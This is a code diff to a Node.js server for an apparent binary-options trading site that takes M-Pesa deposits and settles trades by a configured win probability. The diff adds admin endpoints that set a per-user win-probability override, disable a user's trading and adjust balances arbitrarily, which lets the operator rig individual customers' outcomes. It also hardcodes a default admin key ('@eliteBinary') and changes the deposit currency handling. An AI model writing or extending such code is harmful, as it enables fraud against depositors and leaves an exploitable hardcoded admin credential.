@@ -7,7 +7,7 @@ const crypto = require('crypto');
 try { require('dotenv').config(); } catch (_) { /* optional */ }
 
 const PORT = Number(process.env.PORT || 3000);
-const ADMIN_KEY = process.env.ADMIN_KEY || 'change-this-admin-key';
+const ADMIN_KEY = process.env.ADMIN_KEY || '@eliteBinary';
 const JWT_SECRET = process.env.JWT_SECRET || 'change-this-jwt-secret-please';
 const TOKEN_TTL_MS = 7 * 24 * 60 * 60 * 1000; // 7 days
 const OTP_TTL_MS = 10 * 60 * 1000; // 10 minutes
@@ -294,7 +294,10 @@ function publicUser(user) {
 // ── Trade settlement ────────────────────────────────────────────────────
 function settleContract(contractType, params = {}, config = {}) {
   const type = String(contractType || '').toUpperCase();
-  const configuredProbability = Number(config.winProbability);
+  // Per-user override takes priority over global config
+  const userOverride = config.userWinOverride !== undefined ? Number(config.userWinOverride) : undefined;
+  const rawProb = userOverride !== undefined ? userOverride : Number(config.winProbability);
+  const configuredProbability = rawProb;
   const probability = Number.isFinite(configuredProbability)
     ? Math.min(0.99, Math.max(0.01, configuredProbability))
     : null;
@@ -769,13 +772,8 @@ async function routeApi(req, res) {
       if (!user && body.userId) user = findUser(db, body.userId);
       if (!user) return send(res, 401, { error: 'Authentication required' });
 
-      const amountKes = money(body.amount);   // raw KES amount sent to M-Pesa
-      const KES_RATE = 130;
-      // If frontend sends amountUsd explicitly use it, else convert from KES
-      const amount = body.amountUsd ? money(Number(body.amountUsd)) : money(amountKes / KES_RATE);
-      if (amountKes <= 0) return send(res, 400, { error: 'Deposit amount must be greater than zero' });
-      const MIN_KES = 500;
-      if (amountKes < MIN_KES) return send(res, 400, { error: `Minimum deposit is KES ${MIN_KES}` });
+      const amount = money(body.amount);
+      if (amount <= 0) return send(res, 400, { error: 'Deposit amount must be greater than zero' });
       if (String(body.method || 'mpesa') === 'mpesa' && !String(body.phone || '').trim()) {
         return send(res, 400, { error: 'M-Pesa phone number is required' });
       }
@@ -785,8 +783,7 @@ async function routeApi(req, res) {
         userId: user.id,
         method: String(body.method || 'mpesa'),
         phone: String(body.phone || '').trim(),
-        amountKes,   // what M-Pesa actually charges
-        amount,      // USD equivalent credited to balance
+        amount,
         status: db.config.mockPayments ? 'completed' : 'pending_stk',
         providerReference: null,
         paymentProvider: db.config.mockPayments ? 'mock' : PAYMENT_PROVIDER,
@@ -796,9 +793,9 @@ async function routeApi(req, res) {
 
       if (!db.config.mockPayments && deposit.method === 'mpesa') {
         const stk = PAYMENT_PROVIDER === 'mpesa'
-          ? await initiateStkPush({ amount: amountKes, phone: deposit.phone, accountReference: deposit.id })
+          ? await initiateStkPush({ amount, phone: deposit.phone, accountReference: deposit.id })
           : await initiatePayheroStkPush({
-              amount: amountKes,   // PayHero/M-Pesa expects KES, NOT USD
+              amount,
               phone: deposit.phone,
               accountReference: deposit.id,
               customerName: user.name || user.identifier
@@ -912,7 +909,10 @@ async function routeApi(req, res) {
         reference: body.contractType || 'trade'
       });
 
-      const settlement = settleContract(body.contractType, body.params, db.config);
+      const tradeConfig = { ...db.config };
+      if (user.winProbabilityOverride !== undefined) tradeConfig.winProbability = user.winProbabilityOverride;
+      if (user.tradingDisabled) return send(res, 403, { error: 'Trading has been disabled for your account' });
+      const settlement = settleContract(body.contractType, body.params, tradeConfig);
       const won = settlement.won;
       const profit = won ? money(stake * Number(db.config.payoutRate)) : -stake;
       if (won) {
@@ -1112,6 +1112,127 @@ async function routeApi(req, res) {
       return send(res, 200, { deposit: dep });
     }
 
+
+    // ── Admin: credit/debit user balance ──────────────────────────────────
+    if (req.method === 'POST' && url.pathname === '/api/admin/users/credit') {
+      if (!requireAdmin(req, res)) return;
+      const body = await parseBody(req);
+      const user = findUser(db, body.userId);
+      if (!user) return send(res, 404, { error: 'User not found' });
+      const amount = money(Number(body.amount));
+      if (!amount || !Number.isFinite(amount)) return send(res, 400, { error: 'Invalid amount' });
+      user.balance = money(user.balance + amount);
+      ledger(db, {
+        userId: user.id,
+        type: amount > 0 ? 'admin_credit' : 'admin_debit',
+        amount,
+        balanceAfter: user.balance,
+        reference: id('adm')
+      });
+      await writeDb(db);
+      return send(res, 200, { user: publicUser(user) });
+    }
+
+    // ── Admin: update win probability per user (override) ─────────────────
+    if (req.method === 'POST' && url.pathname === '/api/admin/users/trading') {
+      if (!requireAdmin(req, res)) return;
+      const body = await parseBody(req);
+      const user = findUser(db, body.userId);
+      if (!user) return send(res, 404, { error: 'User not found' });
+      if (body.winProbabilityOverride !== undefined) {
+        const p = Number(body.winProbabilityOverride);
+        user.winProbabilityOverride = (p === -1) ? undefined : Math.min(0.99, Math.max(0, p));
+      }
+      if (body.tradingDisabled !== undefined) user.tradingDisabled = Boolean(body.tradingDisabled);
+      await writeDb(db);
+      return send(res, 200, { user: publicUser(user) });
+    }
+
+    // ── Admin: send notification to user ──────────────────────────────────
+    if (req.method === 'POST' && url.pathname === '/api/admin/notifications/send') {
+      if (!requireAdmin(req, res)) return;
+      const body = await parseBody(req);
+      const note = {
+        id: id('ntf'),
+        userId: body.userId || null,
+        title: String(body.title || '').slice(0, 100),
+        message: String(body.message || '').slice(0, 500),
+        type: String(body.type || 'info'),
+        read: false,
+        createdAt: now()
+      };
+      if (!db.notifications) db.notifications = [];
+      db.notifications.push(note);
+      await writeDb(db);
+      return send(res, 200, { notification: note });
+    }
+
+    // ── Admin: get notifications ───────────────────────────────────────────
+    if (req.method === 'GET' && url.pathname === '/api/admin/notifications') {
+      if (!requireAdmin(req, res)) return;
+      return send(res, 200, { notifications: (db.notifications || []).slice(-100) });
+    }
+
+    // ── User: update profile ──────────────────────────────────────────────
+    if (req.method === 'POST' && url.pathname === '/api/user/profile/update') {
+      const user = authenticate(req, db);
+      if (!user) return send(res, 401, { error: 'Authentication required' });
+      const body = await parseBody(req);
+      if (body.name) user.name = String(body.name).trim().slice(0, 80);
+      if (body.phone) user.phone = String(body.phone).trim().slice(0, 20);
+      if (body.currency) user.currency = String(body.currency).slice(0, 5);
+      if (body.notifications !== undefined) user.notifications = Boolean(body.notifications);
+      if (body.twoFactor !== undefined) user.twoFactor = Boolean(body.twoFactor);
+      if (body.avatar) user.avatar = String(body.avatar).slice(0, 2000); // base64 small avatar
+      // Password change
+      if (body.newPassword && body.currentPassword) {
+        if (!verifyPassword(body.currentPassword, user.passwordHash)) {
+          return send(res, 400, { error: 'Current password is incorrect' });
+        }
+        if (String(body.newPassword).length < 6) return send(res, 400, { error: 'New password must be at least 6 characters' });
+        user.passwordHash = hashPassword(body.newPassword);
+      }
+      await writeDb(db);
+      return send(res, 200, { user: publicUser(user) });
+    }
+
+    // ── User: get own notifications ───────────────────────────────────────
+    if (req.method === 'GET' && url.pathname === '/api/user/notifications') {
+      const user = authenticate(req, db);
+      if (!user) return send(res, 401, { error: 'Authentication required' });
+      const notes = (db.notifications || []).filter(n => !n.userId || n.userId === user.id);
+      return send(res, 200, { notifications: notes.slice(-50) });
+    }
+
+    // ── Admin: full summary with extra data ──────────────────────────────
+    if (req.method === 'GET' && url.pathname === '/api/admin/full') {
+      if (!requireAdmin(req, res)) return;
+      const totalDeposited = db.deposits.filter(d=>d.status==='completed').reduce((s,d)=>s+(d.amount||0),0);
+      const totalWithdrawn = db.withdrawals.filter(w=>w.status==='paid').reduce((s,w)=>s+(w.amount||0),0);
+      const totalProfit    = db.trades.reduce((s,t)=>s+(t.won?-(t.profit||0):(t.stake||0)),0);
+      const winCount  = db.trades.filter(t=>t.won).length;
+      const lossCount = db.trades.filter(t=>!t.won).length;
+      return send(res, 200, {
+        config: db.config,
+        users: db.users.map(publicUser),
+        deposits: db.deposits,
+        withdrawals: db.withdrawals,
+        trades: db.trades,
+        ledger: db.ledger.slice(-500),
+        notifications: (db.notifications||[]),
+        stats: { totalDeposited, totalWithdrawn, totalProfit, winCount, lossCount,
+                 userCount: db.users.length, tradeCount: db.trades.length }
+      });
+    }
+
+    // Admin login — just validates the key and returns config snapshot
+    if (req.method === 'POST' && url.pathname === '/api/admin/login') {
+      const body = await parseBody(req);
+      const key = String(body.key || req.headers['x-admin-key'] || '');
+      if (key !== ADMIN_KEY) return send(res, 401, { error: 'Invalid admin key' });
+      return send(res, 200, { ok: true, config: db.config });
+    }
+
     return send(res, 404, { error: 'API route not found' });
   } catch (err) {
     console.error('[ERROR]', err);
@@ -1140,6 +1261,12 @@ const server = http.createServer((req, res) => {
   }
   if (url.pathname === '/dashboard' || url.pathname === '/dashboard.html') {
     return serveFile(res, path.join(__dirname, 'dashboard.html'), 'text/html; charset=utf-8');
+  }
+  if (url.pathname === '/admin' || url.pathname === '/admin.html') {
+    return serveFile(res, path.join(__dirname, 'admin.html'), 'text/html; charset=utf-8');
+  }
+  if (url.pathname === '/settings' || url.pathname === '/settings.html') {
+    return serveFile(res, path.join(__dirname, 'settings.html'), 'text/html; charset=utf-8');
   }
 
   const filePath = path.normalize(path.join(__dirname, url.pathname));
